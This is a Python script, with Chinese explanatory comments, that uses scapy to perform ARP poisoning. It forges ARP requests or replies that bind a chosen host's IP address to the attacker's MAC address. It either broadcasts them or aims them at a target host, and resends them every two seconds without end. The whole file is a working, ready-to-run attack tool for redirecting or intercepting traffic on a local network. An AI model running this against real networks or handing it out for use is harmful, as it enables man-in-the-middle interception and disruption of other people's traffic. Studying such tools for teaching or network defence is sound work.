# !/usr/bin/python
import os
import sys
import signal
from scapy.all import (
    get_if_hwaddr,   # 获取本机网络接口的函数
    getmacbyip,      # 通过IP地址获取其Mac地址的函数
    ARP,             # 构造ARP数据包
    Ether,           # 构造以太网数据包
    sendp            # 在第二层发送数据包
)
 
from optparse import OptionParser     #格式化用户输入的参数
 
def main():
 
    #自定义程序使用方法，当中的 %prog，optparse会以当前程序名的字符串来替代
    usage = 'Usage: %prog [-i interface] [-t target] host'
 
    #创建一个 OptionParser 对象
    parser = OptionParser(usage)
    #add_option 来定义命令行参数
    parser.add_option('-i', dest='interface', help='Specify the interface to use')
    parser.add_option('-t', dest='target', help='Specify a particular host to ARP poison')
    parser.add_option('-m', dest='mode', default='req', help='Poisoning mode: requests (req) or replies (rep) [default: %default]')
 
    #调用optionparser的解析函数
    (options, args) = parser.parse_args()
 
    if len(args) != 1 or options.interface is None:
        parser.print_help()
        sys.exit(0)
 
    #获取本机网络接口
    mac = get_if_hwaddr(options.interface)
 
#主机型欺骗
#网关型欺骗
 
    #请求包
    def build_req():
        #当没有明确攻击目标时，广播
        if options.target is None:
            pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=args[0])
 
        elif options.target:
            #通过IP地址获取其MAC地址
            target_mac = getmacbyip(options.target)
            #没有获取到MAC地址
            if target_mac is None:
                print("[-] Error: Could not resolve targets MAC address")
                sys.exit(1)
 
            #构造包
            pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, pdst=options.target)
        return pkt
 
    #响应包
    def build_rep():
        if options.target is None:
            #op=1(请求包) op=2(响应包)
            pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=args[0], op=2)
        elif options.target:
            target_mac = getmacbyip(options.target)
            if target_mac is None:
                print("[-] Error: Could not resolve targets MAC address")
                sys.exit(1)
            pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, pdst=options.target, op=2)
        return pkt
 
    #请求
    if options.mode == 'req':
        pkt = build_req()
    #响应
    elif options.mode == 'rep':
        pkt = build_rep()
 
    while True:
        #在两次发送数据包之间有一定的时间间隔，使用inter选项，表示每隔2秒发送一个数据包
        sendp(pkt, inter=2, iface=options.interface)
 
if __name__ == '__main__':
    main()